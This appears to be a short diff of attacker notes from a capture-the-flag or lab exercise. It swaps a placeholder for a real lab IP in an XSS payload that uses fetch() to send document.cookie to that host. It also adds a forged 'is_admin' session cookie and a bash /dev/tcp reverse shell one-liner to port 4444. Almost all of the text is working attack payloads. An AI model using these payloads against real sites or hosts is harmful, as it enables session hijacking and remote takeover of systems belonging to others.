@@ -3,4 +3,8 @@
 
 InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
 
-<img src=x onerror=fetch(‘http://<attacker ip>/?c=’+document.cookie);>
+<img src=x onerror=fetch(‘http://10.10.14.75/?c=’+document.cookie);>
+
+is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
+
+bash -i >& /dev/tcp/10.10.14.75/4444 0>&1
